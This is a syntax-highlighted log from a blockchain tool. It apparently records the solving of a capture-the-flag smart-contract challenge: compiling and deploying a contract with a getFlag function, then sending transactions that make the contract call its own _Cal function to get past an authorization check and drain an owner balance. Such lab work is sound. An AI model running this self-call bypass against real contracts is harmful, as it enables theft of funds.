</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>1000000000000000000</span> <span class=n>Wei</span><span class=p>]</span><span class=o>&lt;=&gt;</span><span class=p>[</span><span class=mi>1</span> <span class=n>Ether</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=err>信息</span><span class=p>:</span> <span class=err>用提供的模式无法找到文件。</span>
</span></span><span class=line><span class=cl><span class=mi>2022</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>06</span> <span class=mi>00</span><span class=p>:</span><span class=mi>09</span><span class=p>:</span><span class=mf>11.594</span> <span class=o>|</span> <span class=n>SUCCESS</span>  <span class=o>|</span> <span class=n>Poseidon</span><span class=o>.</span><span class=n>Blockchain</span><span class=p>:</span><span class=n>SwitchSolidityVersion</span><span class=p>:</span><span class=mi>580</span> <span class=o>-</span> 
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>BlockchainUtils</span><span class=p>][</span><span class=n>SwitchSolidityVersion</span><span class=p>]</span><span class=n>Current</span> <span class=n>Version</span><span class=p>:</span> <span class=mf>0.6</span><span class=o>.</span><span class=mi>12</span>
</span></span><span class=line><span class=cl><span class=mi>2022</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>06</span> <span class=mi>00</span><span class=p>:</span><span class=mi>09</span><span class=p>:</span><span class=mf>11.809</span> <span class=o>|</span> <span class=n>SUCCESS</span>  <span class=o>|</span> <span class=n>Poseidon</span><span class=o>.</span><span class=n>Blockchain</span><span class=p>:</span><span class=n>Compile</span><span class=p>:</span><span class=mi>610</span> <span class=o>-</span> 
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>BlockchainUtils</span><span class=p>][</span><span class=n>Compile</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>FileCourse</span><span class=p>]</span><span class=n>target</span><span class=o>.</span><span class=n>sol</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>ContractName</span><span class=p>]</span><span class=n>ToBeEquel</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>ABI</span><span class=p>][{</span><span class=s1>&#39;inputs&#39;</span><span class=p>:</span> <span class=p>[],</span> <span class=s1>&#39;stateMutability&#39;</span><span class=p>:</span> <span class=s1>&#39;nonpayable&#39;</span><span class=p>,</span> <span class=s1>&#39;type&#39;</span><span class=p>:</span> <span class=s1>&#39;constructor&#39;</span><span class=p>},</span> <span class=p>{</span><span class=s1>&#39;anonymous&#39;</span><span class=p>:</span> <span class=n>False</span><span class=p>,</span> <span class=s1>&#39;inputs&#39;</span><span class=p>:</span> <span class=p>[{</span><span class=s1>&#39;indexed&#39;</span><span class=p>:</span> <span class=n>False</span><span class=p>,</span> <span class=s1>&#39;internalType&#39;</span><span class=p>:</span> <span class=s1>&#39;address&#39;</span><span class=p>,</span> <span class=s1>&#39;name&#39;</span><span class=p>:</span> <span class=s1>&#39;addr&#39;</span><span class=p>,</span> <span class=s1>&#39;type&#39;</span><span class=p>:</span> <span class=s1>&#39;address&#39;</span><span class=p>}],</span> <span class=s1>&#39;name&#39;</span><span class=p>:</span> <span class=s1>&#39;ForFlag&#39;</span><span class=p>,</span> <span class=s1>&#39;type&#39;</span><span class=p>:</span> <span class=s1>&#39;event&#39;</span><span class=p>},</span> <span class=p>{</span><span class=s1>&#39;inputs&#39;</span><span class=p>:</span> <span class=p>[{</span><span class=s1>&#39;internalType&#39;</span><span class=p>:</span> <span class=s1>&#39;address&#39;</span><span class=p>,</span> <span class=s1>&#39;name&#39;</span><span class=p>:</span> <span class=s1>&#39;to&#39;</span><span class=p>,</span> <span class=s1>&#39;type&#39;</span><span class=p>:</span> <span class=s1>&#39;address&#39;</span><span class=p>},</span> <span class=p>{</span><span class=s1>&#39;internalType&#39;</span><span class=p>:</span> <span class=s1>&#39;string&#39;</span><span class=p>,</span> <span class=s1>&#39;name&#39;</span><span class=p>:</span> <span class=s1>&#39;customFallback&#39;</span><span class=p>,</span> <span class=s1>&#39;type&#39;</span><span class=p>:</span> <span class=s1>&#39;string&#39;</span><span class=p>},</span> <span class=p>{</span><span class=s1>&#39;internalType&#39;</span><span class=p>:</span> <span class=s1>&#39;bytes&#39;</span><span class=p>,</span> <span class=s1>&#39;name&#39;</span><span class=p>:</span> <span class=s1>&#39;data&#39;</span><span class=p>,</span> <span class=s1>&#39;type&#39;</span><span class=p>:</span> <span class=s1>&#39;bytes&#39;</span><span class=p>}],</span> <span class=s1>&#39;name&#39;</span><span class=p>:</span> <span class=s1>&#39;CallTest&#39;</span><span class=p>,</span> <span class=s1>&#39;outputs&#39;</span><span class=p>:</span> <span class=p>[],</span> <span class=s1>&#39;stateMutability&#39;</span><span class=p>:</span> <span class=s1>&#39;nonpayable&#39;</span><span class=p>,</span> <span class=s1>&#39;type&#39;</span><span class=p>:</span> <span class=s1>&#39;function&#39;</span><span class=p>},</span> <span class=p>{</span><span class=s1>&#39;inputs&#39;</span><span class=p>:</span> <span class=p>[{</span><span class=s1>&#39;internalType&#39;</span><span class=p>:</span> <span class=s1>&#39;uint256&#39;</span><span class=p>,</span> <span class=s1>&#39;name&#39;</span><span class=p>:</span> <span class=s1>&#39;value&#39;</span><span class=p>,</span> <span class=s1>&#39;type&#39;</span><span class=p>:</span> <span class=s1>&#39;uint256&#39;</span><span class=p>},</span> <span class=p>{</span><span class=s1>&#39;internalType&#39;</span><span class=p>:</span> <span class=s1>&#39;uint256&#39;</span><span class=p>,</span> <span class=s1>&#39;name&#39;</span><span class=p>:</span> <span class=s1>&#39;amount&#39;</span><span class=p>,</span> <span class=s1>&#39;type&#39;</span><span class=p>:</span> <span class=s1>&#39;uint256&#39;</span><span class=p>}],</span> <span class=s1>&#39;name&#39;</span><span class=p>:</span> <span class=s1>&#39;_Cal&#39;</span><span class=p>,</span> <span class=s1>&#39;outputs&#39;</span><span class=p>:</span> <span class=p>[],</span> <span class=s1>&#39;stateMutability&#39;</span><span class=p>:</span> <span class=s1>&#39;nonpayable&#39;</span><span class=p>,</span> <span class=s1>&#39;type&#39;</span><span class=p>:</span> <span class=s1>&#39;function&#39;</span><span class=p>},</span> <span class=p>{</span><span class=s1>&#39;inputs&#39;</span><span class=p>:</span> <span class=p>[{</span><span class=s1>&#39;internalType&#39;</span><span class=p>:</span> <span class=s1>&#39;address&#39;</span><span class=p>,</span> <span class=s1>&#39;name&#39;</span><span class=p>:</span> <span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=s1>&#39;type&#39;</span><span class=p>:</span> <span class=s1>&#39;address&#39;</span><span class=p>}],</span> <span class=s1>&#39;name&#39;</span><span class=p>:</span> <span class=s1>&#39;balances&#39;</span><span class=p>,</span> <span class=s1>&#39;outputs&#39;</span><span class=p>:</span> <span class=p>[{</span><span class=s1>&#39;internalType&#39;</span><span class=p>:</span> <span class=s1>&#39;uint256&#39;</span><span class=p>,</span> <span class=s1>&#39;name&#39;</span><span class=p>:</span> <span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=s1>&#39;type&#39;</span><span class=p>:</span> <span class=s1>&#39;uint256&#39;</span><span class=p>}],</span> <span class=s1>&#39;stateMutability&#39;</span><span class=p>:</span> <span class=s1>&#39;view&#39;</span><span class=p>,</span> <span class=s1>&#39;type&#39;</span><span class=p>:</span> <span class=s1>&#39;function&#39;</span><span class=p>},</span> <span class=p>{</span><span class=s1>&#39;inputs&#39;</span><span class=p>:</span> <span class=p>[],</span> <span class=s1>&#39;name&#39;</span><span class=p>:</span> <span class=s1>&#39;getFlag&#39;</span><span class=p>,</span> <span class=s1>&#39;outputs&#39;</span><span class=p>:</span> <span class=p>[],</span> <span class=s1>&#39;stateMutability&#39;</span><span class=p>:</span> <span class=s1>&#39;nonpayable&#39;</span><span class=p>,</span> <span class=s1>&#39;type&#39;</span><span class=p>:</span> <span class=s1>&#39;function&#39;</span><span class=p>}]</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Bytecode</span><span class=p>]</span><span class=mi>608060405234801561001057600080</span><span class=n>fd5b50336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506101f4600160008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550610b27806100c76000396000f3fe608060405234801561001057600080fd5b506004361061004c5760003560e01c806327e235e314610051578063a0f1d69c14610081578063f96339301461009d578063feb6d173146100a7575b600080fd5b61006b60048036038101906100669190610679565b6100c3565b60405161007891906108fe565b60405180910390f35b61009b600480360381019061009691906106a2565b6100db565b005b6100a56101eb565b005b6100c160048036038101906100bc9190610721565b6102cf565b005b60016020528060005260406000206000915090505481565b6100e483610594565b156101e65760008373ffffffffffffffffffffffffffffffffffffffff1660008433856040516024016101189291906108ae565b60405160208183030381529060405290604051610135919061087c565b60405180910390207bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040516101979190610865565b60006040518083038185875af1925050503d80600081146101d4576040519150601f19603f3d011682016040523d82523d6000602084013e6101d9565b606091505b50509050806101e457fe5b505b505050565b600160003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054600160008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020541461029657600080fd5b7f89814845d4f005a4059f76ea572f39df73fbe3d1c9b20f12b3b03d09f999b9e2336040516102c59190610893565b60405180910390a1565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16148061035457503073ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16145b610393576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161038a906108de565b60405180910390fd5b600160008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054600160003273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020541061043e57600080fd5b600254600160003273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054101561048c57600080fd5b60ff8216600160008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000828254039250508190555080600160003273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282540192505081905550600160003273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546002819055505050565b600080823b905060008111915050919050565b6000813590506105b681610ac3565b92915050565b600082601f8301126105cd57600080fd5b81356105e06105db82610946565b610919565b915080825260208301602083018583830111156105fc57600080fd5b610607838284610a70565b50505092915050565b600082601f83011261062157600080fd5b813561063461062f82610972565b610919565b9150808252602083016020830185838301111561065057600080fd5b61065b838284610a70565b50505092915050565b60008135905061067381610ada565b92915050565b60006020828403121561068b57600080fd5b6000610699848285016105a7565b91505092915050565b6000806000606084860312156106b757600080fd5b60006106c5868287016105a7565b935050602084013567ffffffffffffffff8111156106e257600080fd5b6106ee86828701610610565b925050604084013567ffffffffffffffff81111561070b57600080fd5b610717868287016105bc565b9150509250925092565b6000806040838503121561073457600080fd5b600061074285828601610664565b925050602061075385828601610664565b9150509250929050565b61076681610a3a565b82525050565b610775816109fe565b82525050565b60006107868261099e565b61079081856109b4565b93506107a0818560208601610a7f565b6107a981610ab2565b840191505092915050565b60006107bf8261099e565b6107c981856109c5565b93506107d9818560208601610a7f565b80840191505092915050565b60006107f0826109a9565b6107fa81856109e1565b935061080a818560208601610a7f565b80840191505092915050565b6000610823600e836109d0565b91507f6e6f7420617574686f72697a65640000000000000000000000000000000000006000830152602082019050919050565b61085f81610a30565b82525050565b600061087182846107b4565b915081905092915050565b600061088882846107e5565b915081905092915050565b60006020820190506108a8600083018461075d565b92915050565b60006040820190506108c3600083018561076c565b81810360208301526108d5818461077b565b90509392505050565b600060208201905081810360008301526108f781610816565b9050919050565b60006020820190506109136000830184610856565b92915050565b6000604051905081810181811067ffffffffffffffff8211171561093c57600080fd5b8060405250919050565b600067ffffffffffffffff82111561095d57600080fd5b601f19601f8301169050602081019050919050565b600067ffffffffffffffff82111561098957600080fd5b601f19601f8301169050602081019050919050565b600081519050919050565b600081519050919050565b600082825260208201905092915050565b600081905092915050565b600082825260208201905092915050565b600081905092915050565b60006109f782610a10565b9050919050565b6000610a0982610a10565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b6000610a4582610a4c565b9050919050565b6000610a5782610a5e565b9050919050565b6000610a6982610a10565b9050919050565b82818337600083830152505050565b60005b83811015610a9d578082015181840152602081019050610a82565b83811115610aac576000848401525b50505050565b6000601f19601f8301169050919050565b610acc816109ec565b8114610ad757600080fd5b50565b610ae381610a30565b8114610aee57600080fd5b5056fea264697066735822122018b4012f93aa9f227685db45ce7d3bebb6469bb566e0745dc72d32ee40d67b5c64736f6c634300060c0033</span>
</span></span><span class=line><span class=cl><span class=mi>2022</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>06</span> <span class=mi>00</span><span class=p>:</span><span class=mi>09</span><span class=p>:</span><span class=mf>11.948</span> <span class=o>|</span> <span class=n>SUCCESS</span>  <span class=o>|</span> <span class=n>Poseidon</span><span class=o>.</span><span class=n>Blockchain</span><span class=p>:</span><span class=n>__init__</span><span class=p>:</span><span class=mi>484</span> <span class=o>-</span> 
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Contract</span><span class=p>][</span><span class=n>Instantiate</span><span class=p>]</span><span class=n>Successfully</span> <span class=n>instantiated</span> <span class=n>contract</span> <span class=p>[</span><span class=mh>0xF332E425FC7e63B1cf0D2041505d4E6AcDE38d02</span><span class=p>]</span><span class=o>.</span>
</span></span><span class=line><span class=cl><span class=mi>2022</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>06</span> <span class=mi>00</span><span class=p>:</span><span class=mi>09</span><span class=p>:</span><span class=mf>12.125</span> <span class=o>|</span> <span class=n>SUCCESS</span>  <span class=o>|</span> <span class=n>Poseidon</span><span class=o>.</span><span class=n>Blockchain</span><span class=p>:</span><span class=n>ReadOnlyCallFunction</span><span class=p>:</span><span class=mi>535</span> <span class=o>-</span> 
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Contract</span><span class=p>][</span><span class=n>ReadOnlyCallFunction</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>ContractAddress</span><span class=p>]</span><span class=mh>0xF332E425FC7e63B1cf0D2041505d4E6AcDE38d02</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Function</span><span class=p>]</span><span class=n>balances</span><span class=p>(</span><span class=s1>&#39;0x5799812Cc367Aa90073cba2a1D8f2141547A631b&#39;</span><span class=p>,)</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Result</span><span class=p>]</span><span class=mi>500</span>
</span></span><span class=line><span class=cl><span class=mi>2022</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>06</span> <span class=mi>00</span><span class=p>:</span><span class=mi>09</span><span class=p>:</span><span class=mf>12.271</span> <span class=o>|</span> <span class=n>SUCCESS</span>  <span class=o>|</span> <span class=n>Poseidon</span><span class=o>.</span><span class=n>Blockchain</span><span class=p>:</span><span class=n>ReadOnlyCallFunction</span><span class=p>:</span><span class=mi>535</span> <span class=o>-</span> 
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Contract</span><span class=p>][</span><span class=n>ReadOnlyCallFunction</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>ContractAddress</span><span class=p>]</span><span class=mh>0xF332E425FC7e63B1cf0D2041505d4E6AcDE38d02</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Function</span><span class=p>]</span><span class=n>balances</span><span class=p>(</span><span class=s1>&#39;0x2f7CcF235768B35e0ba171d7Fa60690EF35e79ba&#39;</span><span class=p>,)</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Result</span><span class=p>]</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=mi>2022</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>06</span> <span class=mi>00</span><span class=p>:</span><span class=mi>09</span><span class=p>:</span><span class=mf>12.502</span> <span class=o>|</span> <span class=n>INFO</span>     <span class=o>|</span> <span class=n>Poseidon</span><span class=o>.</span><span class=n>Blockchain</span><span class=p>:</span><span class=n>CallFunction</span><span class=p>:</span><span class=mi>501</span> <span class=o>-</span> 
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Contract</span><span class=p>][</span><span class=n>CallFunction</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>ContractAddress</span><span class=p>]</span><span class=mh>0xF332E425FC7e63B1cf0D2041505d4E6AcDE38d02</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Function</span><span class=p>]</span><span class=n>CallTest</span><span class=p>(</span><span class=s1>&#39;0xF332E425FC7e63B1cf0D2041505d4E6AcDE38d02&#39;</span><span class=p>,</span> <span class=s1>&#39;_Cal(uint256,uint256)&#39;</span><span class=p>,</span> <span class=s1>&#39;0x&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=mi>2022</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>06</span> <span class=mi>00</span><span class=p>:</span><span class=mi>09</span><span class=p>:</span><span class=mf>12.843</span> <span class=o>|</span> <span class=n>INFO</span>     <span class=o>|</span> <span class=n>Poseidon</span><span class=o>.</span><span class=n>Blockchain</span><span class=p>:</span><span class=n>SendTransaction</span><span class=p>:</span><span class=mi>328</span> <span class=o>-</span> 
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Account</span><span class=p>][</span><span class=n>SendTransaction</span><span class=p>][</span><span class=n>Traditional</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>TransactionHash</span><span class=p>]</span><span class=mh>0x49fdd75928684c8ee9a33287a1840f996ff4a86bfb7f44bf889727ad8bb809f2</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Txn</span><span class=p>]{</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;chainId&#34;</span><span class=p>:</span> <span class=mi>8888</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;from&#34;</span><span class=p>:</span> <span class=s2>&#34;0x2f7CcF235768B35e0ba171d7Fa60690EF35e79ba&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;to&#34;</span><span class=p>:</span> <span class=s2>&#34;0xF332E425FC7e63B1cf0D2041505d4E6AcDE38d02&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;nonce&#34;</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;value&#34;</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;gasPrice&#34;</span><span class=p>:</span> <span class=s2>&#34;1.2 Gwei&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;gas&#34;</span><span class=p>:</span> <span class=mi>82584</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;data&#34;</span><span class=p>:</span> <span class=s2>&#34;0xa0f1d69c000000000000000000000000f332e425fc7e63b1cf0d2041505d4e6acde38d02000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000155f43616c2875696e743235362c75696e7432353629000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=mi>2022</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>06</span> <span class=mi>00</span><span class=p>:</span><span class=mi>09</span><span class=p>:</span><span class=mf>16.631</span> <span class=o>|</span> <span class=n>SUCCESS</span>  <span class=o>|</span> <span class=n>Poseidon</span><span class=o>.</span><span class=n>Blockchain</span><span class=p>:</span><span class=n>SendTransaction</span><span class=p>:</span><span class=mi>336</span> <span class=o>-</span> 
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Account</span><span class=p>][</span><span class=n>SendTransaction</span><span class=p>][</span><span class=n>Traditional</span><span class=p>][</span><span class=n>Success</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>TransactionHash</span><span class=p>]</span><span class=mh>0x49fdd75928684c8ee9a33287a1840f996ff4a86bfb7f44bf889727ad8bb809f2</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>BlockNumber</span><span class=p>]</span><span class=mi>92321</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>From</span><span class=p>]</span><span class=mh>0x2f7CcF235768B35e0ba171d7Fa60690EF35e79ba</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>To</span><span class=p>]</span><span class=mh>0xF332E425FC7e63B1cf0D2041505d4E6AcDE38d02</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Value</span><span class=p>]</span><span class=mi>0</span> <span class=p>[</span><span class=n>GasUsed</span><span class=p>]</span><span class=mi>81810</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Data</span><span class=p>]</span><span class=mh>0xa0f1d69c000000000000000000000000f332e425fc7e63b1cf0d2041505d4e6acde38d02000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000155f43616c2875696e743235362c75696e7432353629000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Logs</span><span class=p>][]</span>
</span></span><span class=line><span class=cl><span class=mi>2022</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>06</span> <span class=mi>00</span><span class=p>:</span><span class=mi>09</span><span class=p>:</span><span class=mf>16.871</span> <span class=o>|</span> <span class=n>INFO</span>     <span class=o>|</span> <span class=n>Poseidon</span><span class=o>.</span><span class=n>Blockchain</span><span class=p>:</span><span class=n>CallFunction</span><span class=p>:</span><span class=mi>501</span> <span class=o>-</span> 
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Contract</span><span class=p>][</span><span class=n>CallFunction</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>ContractAddress</span><span class=p>]</span><span class=mh>0xF332E425FC7e63B1cf0D2041505d4E6AcDE38d02</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Function</span><span class=p>]</span><span class=n>CallTest</span><span class=p>(</span><span class=s1>&#39;0xF332E425FC7e63B1cf0D2041505d4E6AcDE38d02&#39;</span><span class=p>,</span> <span class=s1>&#39;_Cal(uint256,uint256)&#39;</span><span class=p>,</span> <span class=s1>&#39;0x&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=mi>2022</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>06</span> <span class=mi>00</span><span class=p>:</span><span class=mi>09</span><span class=p>:</span><span class=mf>17.203</span> <span class=o>|</span> <span class=n>INFO</span>     <span class=o>|</span> <span class=n>Poseidon</span><span class=o>.</span><span class=n>Blockchain</span><span class=p>:</span><span class=n>SendTransaction</span><span class=p>:</span><span class=mi>328</span> <span class=o>-</span> 
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Account</span><span class=p>][</span><span class=n>SendTransaction</span><span class=p>][</span><span class=n>Traditional</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>TransactionHash</span><span class=p>]</span><span class=mh>0x3f416504cb1ba04b1ac421a051e53b336342aee2abb6f2ccaa924625acc7a102</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Txn</span><span class=p>]{</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;chainId&#34;</span><span class=p>:</span> <span class=mi>8888</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;from&#34;</span><span class=p>:</span> <span class=s2>&#34;0x2f7CcF235768B35e0ba171d7Fa60690EF35e79ba&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;to&#34;</span><span class=p>:</span> <span class=s2>&#34;0xF332E425FC7e63B1cf0D2041505d4E6AcDE38d02&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;nonce&#34;</span><span class=p>:</span> <span class=mi>1</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;value&#34;</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;gasPrice&#34;</span><span class=p>:</span> <span class=s2>&#34;1.2 Gwei&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;gas&#34;</span><span class=p>:</span> <span class=mi>52108</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;data&#34;</span><span class=p>:</span> <span class=s2>&#34;0xa0f1d69c000000000000000000000000f332e425fc7e63b1cf0d2041505d4e6acde38d02000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000155f43616c2875696e743235362c75696e7432353629000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=mi>2022</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>06</span> <span class=mi>00</span><span class=p>:</span><span class=mi>09</span><span class=p>:</span><span class=mf>22.574</span> <span class=o>|</span> <span class=n>SUCCESS</span>  <span class=o>|</span> <span class=n>Poseidon</span><span class=o>.</span><span class=n>Blockchain</span><span class=p>:</span><span class=n>SendTransaction</span><span class=p>:</span><span class=mi>336</span> <span class=o>-</span> 
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Account</span><span class=p>][</span><span class=n>SendTransaction</span><span class=p>][</span><span class=n>Traditional</span><span class=p>][</span><span class=n>Success</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>TransactionHash</span><span class=p>]</span><span class=mh>0x3f416504cb1ba04b1ac421a051e53b336342aee2abb6f2ccaa924625acc7a102</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>BlockNumber</span><span class=p>]</span><span class=mi>92323</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>From</span><span class=p>]</span><span class=mh>0x2f7CcF235768B35e0ba171d7Fa60690EF35e79ba</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>To</span><span class=p>]</span><span class=mh>0xF332E425FC7e63B1cf0D2041505d4E6AcDE38d02</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Value</span><span class=p>]</span><span class=mi>0</span> <span class=p>[</span><span class=n>GasUsed</span><span class=p>]</span><span class=mi>51810</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Data</span><span class=p>]</span><span class=mh>0xa0f1d69c000000000000000000000000f332e425fc7e63b1cf0d2041505d4e6acde38d02000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000155f43616c2875696e743235362c75696e7432353629000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Logs</span><span class=p>][]</span>
</span></span><span class=line><span class=cl><span class=mi>2022</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>06</span> <span class=mi>00</span><span class=p>:</span><span class=mi>09</span><span class=p>:</span><span class=mf>22.764</span> <span class=o>|</span> <span class=n>SUCCESS</span>  <span class=o>|</span> <span class=n>Poseidon</span><span class=o>.</span><span class=n>Blockchain</span><span class=p>:</span><span class=n>ReadOnlyCallFunction</span><span class=p>:</span><span class=mi>535</span> <span class=o>-</span> 
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Contract</span><span class=p>][</span><span class=n>ReadOnlyCallFunction</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>ContractAddress</span><span class=p>]</span><span class=mh>0xF332E425FC7e63B1cf0D2041505d4E6AcDE38d02</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Function</span><span class=p>]</span><span class=n>balances</span><span class=p>(</span><span class=s1>&#39;0x5799812Cc367Aa90073cba2a1D8f2141547A631b&#39;</span><span class=p>,)</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Result</span><span class=p>]</span><span class=mi>128</span>
